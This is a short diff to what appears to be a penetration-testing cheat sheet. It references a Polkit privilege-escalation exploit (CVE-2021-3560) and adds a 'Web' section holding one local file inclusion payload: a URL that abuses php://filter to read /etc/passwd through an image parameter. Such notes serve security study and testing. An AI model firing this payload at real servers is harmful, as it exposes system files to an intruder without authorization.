@@ -176,3 +176,9 @@ https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
 ```
 
 ### Windows
+
+### Web
+Read PHP Code with PHP Filter :
+```markdown
+https://X.X.X.X/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
+```
